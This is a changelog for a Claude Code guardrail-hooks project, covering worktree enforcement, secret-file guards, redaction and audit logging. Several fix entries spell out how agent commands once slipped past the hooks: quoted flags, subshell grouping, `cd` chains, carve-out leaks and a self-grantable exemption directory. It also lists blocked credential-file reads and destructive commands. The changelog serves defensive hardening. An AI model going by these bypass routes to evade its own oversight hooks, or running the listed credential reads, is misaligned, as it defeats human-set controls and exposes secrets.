# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Fixed

- **`enforce-worktree`'s `Edit`/`Write`/`MultiEdit` arm is now scoped to the session's own checkout (#238).** The arm judged only the *target file's* enclosing repo — `git rev-parse --show-toplevel` walking up from the file — in isolation from the session, so a legitimate foreign-location write blocked whenever the target happened to land in some primary checkout on `main`: a field report dropped into a git-backed Obsidian vault, a note into a version-controlled `~/Documents` tree, a file into a sibling repo. All three are foreign artifact-drops, not feature work in the session's own shared tree, yet the guard imposed worktree discipline on them — and the block message told the user to `git worktree add` inside a *vault*. The arm now enforces only when the target file's repo is the same repo the session's cwd is in — matched by **git common dir** (`--git-common-dir`), so a repo and its linked worktrees count as one repo, and a write into your own primary tree from a worktree still blocks while a write into a genuinely different repo does not. A write into any *other* repo — or a target/cwd git can't resolve to a repo — is out of scope and allowed. The **`git commit` arm is unchanged**: it still judges every commit target, so *persisting* into a foreign primary still blocks (#224) even where *writing* a file there does not — a deliberate asymmetry, since a stray write is cheap and reversible while a commit onto another checkout's `main` is the collision this guard exists to stop. This also retires the misdirecting foreign-repo block message and the auto-memory/`~/.claude` false-block, both of which only fired because those writes were judged against a foreign repo. `CADENCE_ALLOW_MAIN` continues to cover the orthogonal "session rooted in a main-mode repo (vault/dotfiles)" case. Fail-open per ADR-0001 — this is a discipline nudge, not a security boundary, so relaxing an over-broad arm is aligned: a missed nudge is cheap, a false block is friction.
- **`enforce-worktree`'s `.claude/`/`docs/plans/` carve-out no longer leaks onto the `git commit` arm (#239 F6/F7).** The carve-out lived in the shared `assess_dir`, which the commit arm also calls with the commit's *target directory* — so `cd .claude && git commit` or `cd docs/plans && git commit` short-circuited to allow before repo detection ever ran, letting a repo-wide change ride onto `main` disk-free (and even reversing #224's cross-repo block by appending `/.claude` to another primary's path). A commit's cwd doesn't scope which files it commits, so the carve-out was never right for that arm. It now lives on the Edit/Write arm only — where the *file being edited* being Claude-managed state or an approved plan doc is the actual intent — and the commit arm assesses carve-out-free. The sanctioned "commit an approved plan doc on `main`" path stays the `dismiss` snooze.
- **`enforce-worktree`'s commit detection is now quote-aware and sees through shell grouping and transparent prefixes (#239 F4/F5/F9, issue #230).** The `git` flag-walk used quote-blind `split_whitespace` (while the `cd` arm already used quote-aware `tokenize`), so a spaced quoted value — `git -C "/spaced/path" commit`, `git -c user.name="A B" commit` — split mid-token and the `commit` subcommand was never found, silently allowing the commit. Both arms now share one `tokenize` stream. Each segment is additionally stripped of subshell/brace grouping and transparent command prefixes, so `(git commit)`, `{ git commit; }`, `(cd <dir> && git commit)`, and `command`/`exec`/`time git commit` are detected instead of slipping the leading-word gate. Prefixes are only skipped when the following token isn't an option, so a prefix's own flags are never misparsed. The flag-walk also consumes git globals that take a *separate* value token (`--namespace ns`, `--super-prefix`, `--config-env`, `--attr-source`, alongside `-C`/`-c`), which otherwise stopped the walk on the value and hid the `commit` subcommand.
- **`enforce-worktree`'s Edit/Write arm resolves a new-subdirectory target to its nearest existing ancestor (#239 F1).** A `Write` creating a file in a not-yet-existent subtree (`<primary>/newmod/lib.rs`) had a parent dir git couldn't resolve, so the guard failed open and let a new module land in the shared primary tree. The arm now ascends to the nearest existing directory before resolving the repo; an existing target dir is unchanged (a single `exists()` stat on the hot path).
- **`enforce-worktree` dedups commit targets before assessment (#239 F11).** A pathological command repeating `git commit` N times drove N un-memoized `git rev-parse` spawns; identical targets now resolve once, bounding the hook's subprocess fan-out.
- **`repo_env_flag` tolerates a leading UTF-8 BOM in a repo's `.claude/settings.json` (#239 F10).** An editor-added BOM made `serde_json` reject the file, silently dropping a *declared* `CADENCE_ALLOW_MAIN` and false-blocking a by-design-main repo — exactly what the block message tells the user to set. The BOM is now stripped before parsing (JSONC comments/trailing commas remain a strict-parse reject; no lenient-parser dependency added).

## [0.48.0] - 2026-07-06

### Fixed

- **`enforce-worktree` now resolves a `cd <dir> && git commit` prefix — including cross-repo `cd`s — instead of only honoring the equivalent `git -C <dir> commit` (#213, #224).** The guard's commit-target resolver walked command segments looking for a leading `git`, silently dropping any `cd` segment, so `cd <worktree> && git commit` was misjudged as mutating the shell's original cwd repo while the identical-intent `git -C <worktree> commit` was already honored — a real block/allow inconsistency for the same operation. It now tracks the effective directory through a command's `cd` chain (`~` expansion, quoted paths, and multiple `cd`s accumulating) before resolving each `git commit` segment's target, so a `cd` into a worktree now passes and a `cd` into a *different* primary checkout still blocks — but now judged against, and naming, that target repo rather than the repo the shell started in. The block message adds an explicit "targets `<repo>`, judged against that repo — not `<origin>`" line whenever the two differ. Unlike `core::shell::parse_work_dir` (which feeds soft nudges on six other guards and stays unchanged), this resolver always assumes a `cd` succeeds even when immediately followed by `||` — bash's `||`/`&&` are equal precedence and left-associate, so `cd <dir> || true && git commit` commits *inside* `<dir>` whenever the cd succeeds, and reusing the nudge-oriented "cd before `||` is a no-op" heuristic here would have let such a commit slip through judged against the pre-cd cwd (a real bypass caught in review). It also skips `cd`'s own option flags (`-P`, `-L`, `--`) to find the real path argument, and treats a bare `-` (`$OLDPWD`), an unexpanded shell variable (`$VAR`), or no path argument at all as unresolvable — keeping the pre-cd directory rather than building a bogus path that resolves to no repo and fails open (a second bypass this fix introduced and review also caught, e.g. `cd -P .` misread as a target literally named `-P`).
- **`dismiss-enforce-worktree` gained a `--repo <path>` option to snooze a repo other than the current directory's**, since the guard above can now block against a `cd`-redirected *target* repo that differs from the shell's cwd — a plain `dismiss-enforce-worktree` (which always keyed off cwd) couldn't reach that marker. Defaults to the current directory when omitted, unchanged from before.
- **`enforce-worktree`'s `CADENCE_ALLOW_MAIN` exemption is now repo-scoped, not just process-env-scoped (#232).** #226 made the guard's target *resolution* repo-aware (a `cd`/`-C`-redirected commit is judged against the target it lands in), but the *exemption* stayed process-env-only — so a cross-repo `git -C <repo> commit` (or `cd <repo> && git commit`) into a by-design-main repo (dotfiles, vaults) still blocked, even though that repo's own `.claude/settings.json` declared `CADENCE_ALLOW_MAIN`, because Claude Code only injects a repo's `env` block for sessions rooted in that repo. The guard now falls back to reading the flag from the resolved target repo's own tracked settings when process env doesn't set it — `.claude/settings.local.json` overriding `.claude/settings.json`'s `env` block, matching Claude Code's local-over-shared precedence — via a bounded/hardened read (`read_untrusted_config`, #157/#194: regular-file check, 1 MiB cap) that is fully fail-open (a missing file, absent key, malformed JSON, or non-scalar value all just mean "not declared," never a block or a panic, per ADR-0001). The lookup is memoized per invocation per repo root. A ride-through via this path logs bypass provenance as `CADENCE_ALLOW_MAIN (repo settings)`, distinguishing it from the plain env-var mechanism. Verifying that provenance surfaced a latent gap in the just-added bypass log (below): the Bash `git commit` arm returned only non-Allow results and otherwise fell through to a bare allow, so a *bypassed* commit-allow — a snooze, an env switch, or this new repo-declared exemption — dropped its provenance and never reached `bypasses.jsonl`; the arm now propagates the first bypassed allow (a block on any target still wins first). Every prior provenance test drove the Edit arm, so the Bash-arm gap went unseen until the repo-settings case exercised a bypassed allow through it.

### Security

- **`read_body_file` no longer shares the #157 unbounded-read DoS shape (#194).** The `redact_external_content` reader for `gh`/`git` `--body-file`/`-F` arguments used an unbounded `fs::read_to_string`, so a body-file path resolving to a symlink to an endless special file (`/dev/zero`, a FIFO) or a multi-GB blob could hang or OOM the hook. It now routes through the same `core::paths::read_untrusted_config` #157 introduced — rejecting anything that is not a regular file and capping the read at 1 MiB — failing open (ADR-0001).

### Added

- **guard-bypass provenance — every guardrail bypass now leaves a durable, privacy-safe audit line.** A new `bypasses.jsonl` metrics stream records two events: `armed` (a `dismiss-*` snooze was set) and `used` (a write rode through an active dismissal or env switch, which the denial log can't see because a bypass is an allow). Each line carries the guard, mechanism, kind (`dismissal`/`env_switch`), session, repo **basename**, a user-authored reason, and the expiry — never a command, path, or edited content (privacy-by-construction, like `denials.jsonl`). Both `dismiss-enforce-worktree` and `dismiss-main-branch-warn` gain `--reason`, **required for a dismissal longer than 1h** and nudged at or under it; the reason/session/expiry also land in a provenance sidecar beside the snooze marker (the load-bearing `{epoch}` marker is unchanged). v1 wires the two highest-value guards (`enforce-worktree`, `warn-main-branch`); the remaining guards, the global gates, and read-side surfacing are a tracked follow-up. Fully fail-open (ADR-0001) — a failed audit write never turns an allow into a block.

## [0.47.0] - 2026-07-05

### Added

- log-plan-phase — appends EnterPlanMode/ExitPlanMode lifecycle records (with a whole-transcript token/cost scan) to `plan-phases.jsonl`; pilots the `schemaVersion` convention (#218)

## [0.46.0] - 2026-07-03

### Added

- threshold-gated hook self-timing — hooks slower than CADENCE_HOOK_TIMING_THRESHOLD_MS (default 1000) are logged to hooks.jsonl (#143)
- warn-subagent-concurrency — nudges when live subagents reach CADENCE_MAX_CONCURRENT_SUBAGENTS (default 5) (#145)
- warn-branch-intent — nudges when new work starts on a stale, unrelated branch; once per session, opt out with CADENCE_ALLOW_BRANCH_INTENT (#155)
- **guard-read-model — opt-in per-model Read/Grep guard (#144).** Resolves the current session model from the transcript tail (`core::transcript::last_assistant_model`, no metrics dep) and blocks Read/Grep per `CADENCE_READ_MODEL_GUARD_*` policy: `CADENCE_READ_MODEL_GUARD_MODELS` (space/comma list of family keywords or full ids; unset → disabled), `CADENCE_READ_MODEL_GUARD_MODE` (`deny`|`allow`, default `deny`), `CADENCE_READ_MODEL_GUARD_ON_UNKNOWN` (`block`|`allow`, default `allow`). Matching is case-insensitive substring (`opus` matches `claude-opus-4-8`). Blocks ONLY on a positively-identified denied model; fail-open on unknown — a missing/empty/unreadable transcript never bricks reads (ADR-0001).
- audience-aware redaction — redact-external-content now gates each hit on destination-tier vs per-category ceiling (d>c), nudge-only (#159)
- session bounds (startTs/endTs/durationMs) and commits count on sessions.jsonl, plus a log-session-start hook to stamp SessionStart (#182)
- **warn-going-public — nudges on repo create/edit when the repo name or description telegraphs sensitive content; sensitive terms via `CADENCE_GOING_PUBLIC_TERMS`, relief via `CADENCE_GOING_PUBLIC_IGNORE` (#128).**

### Fixed

- warn-recommended-option now allows a declared "no clear recommendation" stance (fires only on true silence) (#148)
- **terminology guard's `cadence-hooks` exemption is now scoped to the active checkout, closing a self-grantable bypass (#139).** The exemption fired on any path with a `cadence-hooks` component, so `mkdir /tmp/cadence-hooks` plus a doc carrying a blocked term self-granted the free pass. It now fires only when the edit targets a file inside the current checkout AND that checkout is genuinely the cadence-hooks repo (identified by its primary-checkout dir name via the git common dir), so linked worktrees stay exempt while unrelated repos merely nested under a `cadence-hooks`-named ancestor no longer do. The `is_within` containment primitive (which rejects `..` traversal) is promoted from `crates/lab` to `crates/core` as the single implementation. Fail-safe: every failure path falls through to a block.
- **`dismiss-enforce-worktree` marker now resolves the git common dir, so snoozing works from a linked worktree (#179).** The marker was written under the passed directory's own `.git/cadence-hooks/`, which for a linked worktree is the per-worktree git dir — invisible to the primary checkout where the guard fires. Both the reader and the dismiss CLI now resolve the shared common dir via `git rev-parse --git-common-dir`, so a snooze recorded from any worktree is honoured at the primary. Fail-open on non-repos preserved (ADR-0001).

### Removed

- Retired check-idle-return guard — moot once a hook must execute to run (it re-caches anyway) (#151)

## [0.45.0] - 2026-07-03

### Added

- **feat(doctor): plugin-cache health check (#162).** `doctor` now flags orphaned SHA-pinned cache version dirs (with a byte count), missing/empty pinned dirs, and marketplace checkouts whose `git remote` diverges from their declared `known_marketplaces.json` source ("cache may not be canonical — verify before citing"). All advisory (Warning/exit 1), live-machine only (skipped under `--root`), fail-open throughout (ADR-0001). Orphan counts surface in verbose mode only to avoid perennial SessionStart nags; detection-only — `--fix` prune deferred.

### Changed

- **`warn-issue-tracker` is now decentralization-aware (#166).** The guard hardcoded `cameronsjo/claude-configurations` as the single canonical tracker and misfired on the legitimate post-2026-06-30 trackers. It now checks the filing target against a set of known ecosystem trackers (`cadence`, `cadence-hooks`, `forgectl`, `claude-configurations`), nudging only when an *owned* repo is none of them. New `CADENCE_ISSUE_TRACKERS` (plural, comma-separated) overrides the set; the legacy singular `CADENCE_ISSUE_TRACKER` still works. Still nudge-only, never blocks (ADR-0001).
- **docs(changelog): backfilled the missing `[0.30.0] - 2026-06-16` section**
  (#140). The changelog jumped `[0.31.0]` → `[0.29.0]`; the three fixes that
  shipped in v0.30.0 are now stamped into a versioned section.
- docs(hooks): add missing metrics-logger rows (`log-session`, `log-polish-nudge`, `log-ask-user-question`) to the cadence-metrics table in `docs/hooks.md` (#178)
- docs(testing): document isolating a block to the binary vs the run-cadence-hooks wrapper, and the wrapper's fail-open signal (#69)

### Fixed

- **Persona ledger is now bounded and its session-start dedupe no longer full-parses every line (#137).** The append-only `personas.jsonl` grew without limit and every SessionStart re-parsed the whole file (one `serde_json::Value` per line) just to dedupe one `session_id`. `ledger_contains` is now a reverse substring scan (no per-line JSON parse), and `promote` rotates the ledger to a configurable `ledger_max_entries` cap (default 1000; `0` disables), keeping the newest records and collapsing duplicate `session_id`s. Rotation is confined to the PostToolUse promote path and atomic (temp-write + rename), fail-open throughout (ADR-0001).
- **`obsidian trash-guard` now catches non-`rm` deletion verbs (#136).** The guard gated solely on `command.contains("rm")`, so `unlink note.md`, `find … -delete`, `shred -u note.md`, and `truncate -s 0 note.md` destroyed vault files while bypassing Obsidian's `.trash/`. A shared `is_destructive` gate now matches all four (token-based, so `find` without `-delete` stays read-only and allowed), reusing the existing vault-targeting logic unchanged.
- **`guard-gh-write` no longer blocks explicit-target `gh` reads in a loop (#158).** The `AllTargetsExplicit` loop branch ownership-gated every command, so a loop of `-R`/`--repo` reads against an unowned repo false-blocked. Reads are owner-independent; the branch now gates on `is_write_command`, mirroring the `MissingTargets` path. Unowned looped writes still block.
- `warn-main-branch` carve-outs (`.claude/`, `docs/plans/`) now lexically resolve `..`/`.` in the path before matching, so a crafted `file_path` like `docs/plans/../../src/main.rs` can no longer suppress the main-branch nudge for a real product file (#152).
- **`log-polish-nudge` now records the branch-scoped marker signal the pre-PR
  gate acts on, not just a session-log scan (#177).** A new
  `polish_marker_present(command, cwd)` helper in core is the single source of
  truth both the `nudge-polish-before-pr` gate and the metric call; the metric
  emits `markerPresent` alongside `polished`, making the gate-truth denominator
  queryable and the scan-vs-marker drift measurable. Fail-open throughout
  (ADR-0001).
- **`effective_content()` reads the literal write target, not the normalized path (#129).** For Edit/MultiEdit the helper now simulates against the file actually being written — a trailing-space/backslash/null path variant no longer makes a guard validate a different (or missing) file. Fail-open on an unreadable/non-UTF-8 file is preserved (ADR-0001) and documented; a future *blocking* content-security guard must supply its own fail-closed default.
- **Content-aware `.envrc` carve-out on the secret guards' tool paths (#149).** A `.envrc` of pure direnv loader directives (`use flake`, `dotenv`, `layout`, `source`, `PATH_add`, comments, `PATH`/`MANPATH` assignments) is a committed config loader, not a secret store — but `prevent-secret-writes` / `prevent-secret-leaks` hard-blocked every `.envrc` by name. Write/Edit now consult the resulting content (`effective_content`) and Read/Grep read the file to classify it; a proven pure-loader `.envrc` is allowed, while a `.envrc` carrying a `KEY=<value>` assignment or any provider-shaped secret value still blocks. Fail-closed: unreadable/unrecognized content stays blocked, and only `.envrc` is eligible — the rest of the `.env` family remains secret by name. The Bash arms (`cat .envrc`, `cat > .envrc`) still name-block pending a follow-up.
- **Bash-path coverage for non-`.env` deny-set secret files (#138).** The secret guards' Bash arms judged only the `.env` family, so `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa`, `cat ~/.git-credentials`, `cat ~/.pgpass`, `cat ~/.kube/config`, and `cat ~/.netrc` — all already blocked on the tool paths — read and wrote freely over Bash. A new `is_dangerous_secret_token` classifier consults the full `BLOCKED_FILENAMES` / `BLOCKED_PATH_FRAGMENTS` deny-sets, and a `command_may_reference_secret` pre-filter generalizes the old `.env`-only gate. Safe templates short-circuit so `id_rsa.pub` and `.aws/credentials.example` stay readable. `.envrc` keeps its Bash name-block (content carve-out stays tool-path-only, #149).

### Security

- **`check-security-patterns` scans the simulated post-edit document and gains RCE/XSS coverage (#131).** The guard now routes through `effective_content()` (correct line numbers; no more scanning an Edit fragment or a MultiEdit's stale pre-edit file), and flags Python `eval(`/`exec(`/`os.system(`/`pickle.load(` and JS `eval(`/`document.write(`/`dangerouslySetInnerHTML`. Advisory-only (never blocks).
- **Harden untrusted `.claude/*.json` config reads against a local special-file DoS (#157).** The per-repo `terminology.json` and `redaction.json` readers used an unbounded `fs::read_to_string` with no file-type check, so a `.claude/*.json` that was a symlink to an endless special file (`/dev/zero`, a FIFO) or a multi-GB blob could hang or OOM the hook when it fired inside a cloned/shared repo. Both now route through a new `core::paths::read_untrusted_config`, which rejects anything that is not a regular file (on `stat`, before any blocking read) and caps the read at 1 MiB, failing open (ADR-0001) — a rejected config is treated as absent.

## [0.44.0] - 2026-07-02

### Added

- **`metrics warn-stale` — telemetry staleness alarm at SessionStart + a
  `doctor` surface (#161).** Warns once per day when the newest cadence-metrics
  JSONL write is older than a threshold (`CADENCE_METRICS_STALE_DAYS`, default
  4 days) — the signal the "second death" incident lacked, where the metrics
  dir went silently quiet while sessions kept running (mis-wired hooks or a
  disabled plugin). The pure `staleness()` core watches only top-level
  `*.jsonl` mtimes (the `state/` marker dir never counts), and a dated
  `state/stale_warn.date` marker throttles the nudge to once per calendar day.
  `cadence-hooks doctor` reports the same staleness as a `Warning` (exit 1) in
  its default scan — skipped under `--root` so a fixture run never reads the
  dev machine's live telemetry. Fail-open everywhere (ADR-0001): a missing
  dir, unreadable file, fresh install, bad env value, or marker IO error all
  resolve to silence or a plain nudge — never a block. The SessionStart hook
  wiring ships in the companion cadence-metrics plugin PR.
- **`metrics log-session` — per-session cost at `SessionEnd`
  (`sessions.jsonl`).** A fifth `log-*` logger that scans the whole transcript
  once at session end, prices it per-model, and appends one row with
  `sessionId`, `repo`, `branch`, `reason`, `durationApproxMs`, `tokens`,
  `costUsd`, `byModel[]`, `unpricedModels[]`, `messagesScanned`,
  `lastMessageId`, `agentId`, `parentSessionId`. Where `log-commit` prices the
  range since the last commit marker, `log-session` prices the whole transcript,
  so `sum(commits) ≤ session` — the gap is uncommitted-work cost, and each
  `/clear` segment writes its own row. Adds `MetricsInput.reason` (the
  SessionEnd exit reason) and extracts the `byModel[]` / `unpricedModels[]`
  builders into a shared `model_breakdown` module so `log-commit` and
  `log-session` emit identical shapes. Gated on
  `hook_event_name == "SessionEnd"` and fail-open (ADR-0001); the SessionEnd
  hook wiring ships in the companion cadence-metrics plugin PR. Refs
  cameronsjo/cadence#141.
- **`denials.jsonl` — guard-denial audit log at the dispatch outcome→exit-code
  seam.** Records one append-only line per guard `deny` (a hard block, exit 2),
  and per `nudge` when `CADENCE_LOG_NUDGES` is set — fields `ts`, `hook`,
  `event`, `decision`, `tool`, `repo`, `sessionId`, `agentId`. A PreToolUse
  block was previously prose-only, invisible to attachment counting and leaving
  zero on-disk trace when a false positive fired. The write lives at the single
  `run_check` seam (split into `decide_check` + `emit_and_exit`) via a
  binary-level `run_logged_check` wrapper that threads the canonical registry
  hook name; every block-capable check arm routes through it, loggers are
  untouched. **Privacy by construction:** the record names which guard fired on
  which tool in which repo, never the command text, file path, or edited
  content. Fail-open (ADR-0001): a full disk or unwritable metrics dir degrades
  to a no-op and the block still exits 2 with byte-identical stderr. Consumer:
  `claude-configurations` `profiler_tally.py` renders a denies-by-hook table.

### Added

- **`guardrails enforce-worktree` — hard block on mutations in a primary
  checkout of a branch-mode repo.** Enforces the worktree-isolation invariant
  (every session in its own worktree, or in a `CADENCE_ALLOW_MAIN` repo where
  main is the working branch by design) that replaces advisory multi-session
  coordination — see claude-configurations ADR-0030. Blocks Edit/Write/MultiEdit
  and leading-`git commit` (including `git -C <primary>` forms) when the target
  repo's `.git` is a directory; linked worktrees (`.git` file) pass untouched.
  Exemptions: `CADENCE_ALLOW_MAIN`, the `CADENCE_NO_ENFORCE_WORKTREE` kill
  switch, temp-rooted scratch repos, `.claude/` and `docs/plans/` paths, and a
  new `guardrails dismiss-enforce-worktree --for <duration>` snooze (24h cap).
  Fails open on any git/parse failure (ADR-0001).

## [0.42.0] - 2026-07-02

### Added

- **Per-repo terminology exemptions (`.claude/terminology.json`).** The
  `terminology` guard now reads an optional `<git-root>/.claude/terminology.json`
  that softens its hard block for named files and terms — mirroring the
  `.claude/redaction.json` precedent. Each `exemptions[]` entry takes `paths`
  (glob patterns: a `/`-bearing pattern matches the repo-relative path with `**`
  spanning separators, a bare pattern matches the basename anywhere), optional
  `terms` (case-insensitive against the display term; omit to exempt all), and an
  optional `mode` (`allow` drops the violation, `nudge` demotes a block to an
  advisory). It can only ever *remove* or *demote* a violation, never add one;
  the global hard block and the built-in path baseline are untouched. Missing,
  unreadable, or invalid JSON is ignored (fail-open, ADR-0001). The shared
  `find_git_root` walk also moved into `core::paths`. See
  [docs/configuration.md](docs/configuration.md#per-repo-terminology-exemptions).

### Fixed

- **guard blocks no longer emit a schema-invalid JSON envelope on stdout**
  (#165). The `run_check` `Block` arm exited 2 but *also* wrote a
  `permissionDecision:"deny"` JSON envelope to stdout when a `BlockMetadata` was
  present under `PreToolUse`. On exit 2 Claude Code ignores stdout entirely, so
  that envelope delivered nothing — and its `additionalContext` was an object
  (the metadata struct) where the schema requires a string, registering as an
  output-schema validation failure in telemetry (observed: 99 fires from
  `guard-gh-write` alone). Blocks are now stderr-only (exit-2 enforcement is
  unchanged); the one machine-intended datum, `BlockMetadata::fix`, folds into
  the stderr text as a `Fix:` line when the prose doesn't already carry one.
  Output rendering is extracted into a pure `render_output` function so the
  exit-code × output-shape matrix is unit-tested (the anti-regression assertion:
  a block emits no stdout; a nudge's `additionalContext` is string-typed).
- **nudge-polish-before-pr: see polish run in a subagent transcript** (#247 on
  claude-configurations). The pre-PR polish gate (and the `log-polish-nudge`
  metric) read only the *parent* session transcript, so `cadence-forge:polish`
  invoked inside a subagent was invisible — delegated PR flows were hard-blocked
  and logged `polished: false` despite a real polish run. Both now also scan
  this session's child transcripts (`<stem>/subagents/agent-*.jsonl`): a polish
  run in any child satisfies the gate. The scan is lazy (only on the
  would-block path) and fail-open at every step (missing dir / unreadable child
  → falls through, never blocks on our own missing data, ADR-0001).
- **rules validate-frontmatter: accept the valid `paths` field** (#227 on
  claude-configurations). `paths` — Claude Code's conditional-activation field
  that scopes a skill to fire only when matching files are touched, documented
  in `cadence:writing-skills` — was absent from the validator's allowed-field
  set, so every `Write` to a path-scoped `SKILL.md` under a real skills
  directory hard-blocked with `Unknown frontmatter field: 'paths'`. Added
  `paths` to `VALID_FIELDS`; path-conditional skills now write cleanly.
- **metrics: correct opus-4-7/4-6 prices + honor CADENCE_METRICS_DIR**
  (claude-configurations#127, claude-configurations#120). `claude-opus-4-7` and
  `claude-opus-4-6` were priced at $15/$75/MTok (3× too high); corrected to
  $5.00 input / $25.00 output / $6.25 cache-write / $0.50 cache-read, matching
  `claude-opus-4-8`. `metrics_dir()` now checks `CADENCE_METRICS_DIR` first
  before falling back to `CLAUDE_CONFIG_DIR`-derived path, so integration tests
  that set that variable actually redirect output.

## [0.41.0] - 2026-06-23

### Changed

- **nudge-polish-before-pr: transcript-aware conditional block** (#151 on
  claude-configurations). The pre-PR polish reminder was a soft nudge (allow +
  warn) on every `gh pr create`, so the model could talk past it — "day 3 of
  polish not needed." It now scans the session transcript (via
  `core::transcript::transcript_has_polish_run`, extracted from the metrics
  logger into a shared module and tightened — exact-leaf match replaces the
  prior `.contains("polish")`, so the metrics logger's `polished` field no
  longer counts decoys like `repolish`) for a real `cadence-forge:polish` Skill
  run and routes a 3-way,
  fail-open outcome: a transcript **showing** a polish run → silent **allow**
  (kills the nag-after-polish noise); a readable transcript with **no** polish
  run → **block** (exit 2, the teeth); no / empty / unreadable / unparsable
  transcript → the original **nudge** (ADR-0001 — never block on our own missing
  data). Polish-skill detection is leaf-exact (rejects decoys that merely
  contain `polish`). The
  block message reassigns authority — run `/polish`, or surface a believed-
  legitimate skip to Cameron, who decides; the model may not self-approve — and
  does not advertise a self-serve bypass. Same subcommand, event, and matcher;
  `HookInput` gains a `transcript_path` field (a documented common field on
  every hook event).

### Fixed

- **warn-main-branch: carve out `docs/plans/`** (#226 on claude-configurations).
  The on-main editing nudge fires once per session, and a plan-document write to
  `docs/plans/` — which cadence mandates on the default branch — consumed that
  one-shot warning, letting later real product edits on `main` escape unwarned.
  Plan-doc directories are now exempt alongside the existing `.claude/` carve-out
  (consecutive `docs`→`plans` path components; a bare `plans/` or a look-alike
  such as `mydocs/plans` still warns). Nudge-only; the fail-open contract is
  unchanged.

## [0.40.0] - 2026-06-23

### Fixed

- **doctor: honest version-skew advisory + clearer bare invocation** (#223 on
  claude-configurations). The skew advisory hardcoded `brew upgrade
  cadence-hooks` even when the Homebrew tap was already current, so the
  recommended command was a silent no-op and the SessionStart banner returned
  every session with no way to clear it. `doctor` now detects the binary's
  install channel from `current_exe()` and names the truthful upgrade path:
  Homebrew installs still get `brew upgrade` but with a source fallback for the
  "tap already current" case; cargo / unknown installs are pointed at `cargo
  install` or the releases page (mirroring the binary's own runtime fallback).
  The quiet SessionStart banner defers channel-specific detail to `cadence-hooks
  doctor`. Separately, a bare `cadence-hooks` (no subcommand) now prints plain
  `--help` guidance instead of the "a plugin expects a newer version" warning,
  which is now reserved for genuinely unknown subcommands. Advisory-only — exit
  codes and the fail-open contract are unchanged.

## [0.39.0] - 2026-06-23

### Added

- **metrics: `log-ask-user-question` — record AskUserQuestion stance + shape on
  every call** (#210 on claude-configurations). A fire-and-forget PreToolUse
  logger that appends one line to `<metrics_dir>/askuserquestion.jsonl` per
  AskUserQuestion call: the call's *stance* — `recommended` when an option label
  carries `(Recommended)`, `declared_no_rec` when a question text carries the
  `no clear recommendation` marker, else `silent` — plus its shape
  (`multiSelect`, `nQuestions`, `nOptions`, `sessionId`, `model`). Stage 1 of
  making `(Recommended)` reliable: pure observation, zero behavior change — the
  `silent` rate is the diagnostic denominator for "is Claude omitting a
  recommendation, or are the options genuinely equivalent?". The shared
  `stance(...)` classifier (new `Stance` enum in `rules::askuserquestion`) is
  reused by the `warn-recommended-option` nudge so the two never drift;
  `MetricsInput` gains a `model` field. The `cadence-metrics` hooks.json wiring
  ships alongside. Releasing this closes the binary/plugin skew that the
  SessionStart `doctor` advisory flagged on 0.38.0 (claude-configurations #223).

## [0.38.0] - 2026-06-23

### Added

- **cadence: `redact-external-content` — nudge when an external post mentions
  internal harness vocabulary** (planning issue #27 on claude-configurations).
  A PreToolUse **nudge** (never a block) that scans the *body text* of
  external-posting Bash commands — `gh pr/issue/release/gist/discussion`
  create/comment/edit, `git commit`, `tea pr/issue` — and flags four categories
  of harness-internal vocabulary before the content ships: skill/plugin IDs
  (`cadence:attune`, derived from a maintained namespace list), local filesystem
  paths (`/Users/…`, `~/.claude/…`, `/private/tmp/claude-*`), marketplace/cache
  paths (`~/.claude/plugins/…`, `cache/workbench/…`, raw marketplace URLs), and
  bare harness nouns (`harness`, `transcript`, `tool_input`, `tool_response`).
  Bodies are pulled from `--body`/`-b`/`-m`/`--message`, `--body-file`/`-F`
  (read from disk), and heredocs carried in a quoted command substitution.
  A per-repo `.claude/redaction.json` extends it: `additionalPatterns` flag
  project-specific strings (with a suggested replacement) and `allowlist`
  suppresses hits — a full token (`cadence:writing-skills`) suppresses that
  exact snippet, a bare namespace (`cadence-forge`) suppresses every skill-id
  in that namespace (so a repo that legitimately discusses a whole namespace
  can allow-list it wholesale).
  Missing/invalid config, unreadable body files, and unrecognized commands all
  fail open silently. Binary subcommand only — the plugin's hooks.json wiring
  (with the `if` filter) lands in a separate PR.

## [0.37.0] - 2026-06-22

### Added

- **guardrails: `warn-subagent-worktree` — nudge when dispatching a subagent
  from main while a sibling worktree exists** (#201 on claude-configurations). A
  subagent inherits the *spawning session's* working directory, so a session in
  the main checkout spawns subagents that operate on the main checkout — never a
  sibling worktree. This PreToolUse check fires once per session (per repo) on an
  `Agent`/`Task` spawn when the session is in the primary checkout (`.git` is a
  directory, not a linked-worktree file), a sibling worktree exists
  (`git worktree list` shows more than the primary), and the spawn doesn't set
  `isolation: "worktree"`. The nudge names both fixes — dispatch from inside the
  worktree, or pass `isolation: "worktree"` for a fresh one — and a permanent
  per-repo opt-out via `CADENCE_ALLOW_SUBAGENT_FROM_MAIN=true`. `ToolInput` gains
  `subagent_type` / `isolation` (snake_case, matching the Agent payload).

## [0.36.0] - 2026-06-22

### Added

- **metrics: `log-polish-nudge` — deterministic telemetry for polish-nudge
  efficacy** (#151 on claude-configurations). A new PostToolUse metrics Logger
  fires on `gh pr create` — the same `is_gh_pr_create` predicate that drives
  `nudge-polish-before-pr`, so the recorded set is exactly the PRs that got
  nudged (the denominator). Each row appends to `polish_nudges.jsonl` with
  `{ts, sessionId, transcriptPath, branch, repo, polished}`, where `polished`
  is a best-effort transcript scan for a `cadence-forge:polish` Skill
  invocation earlier in the session; a `polished: false` row is a deterministic
  *skip candidate*. (A line merely mentioning `/polish` in prose does not count
  — only an actual Skill `tool_use` does.) Distinguishing a *rationalized* skip
  from a legitimate one stays a transcript/prose judgment, but the rate is now
  queryable without re-mining every transcript. `is_gh_pr_create` moved to
  `cadence_hooks_core::shell` so the nudge and the logger share one definition.
  (Wiring this logger into the cadence-metrics plugin's `hooks.json` is the
  companion step.)

### Fixed

- **session: the heartbeat now sweeps stale peer lanes** (#155 on
  claude-configurations). `sweep_stale` had exactly one production trigger —
  SessionStart — so a long-lived session that swept once at its own start never
  reaped a peer that went stale afterward, and forks/subagents (which never fire
  the cadence-canon SessionStart) never swept at all. Dead lanes accumulated (17
  of 17 unreaped in a shared checkout) while `session status` kept *classifying*
  them `[STALE]` on demand — the classifier and the reaper shared one threshold
  and one mtime helper, so the gap was never a predicate mismatch, only the
  reaper's trigger set. The reaper now also runs from the PostToolUse heartbeat —
  the only high-frequency signal every live session emits — so dead peers are
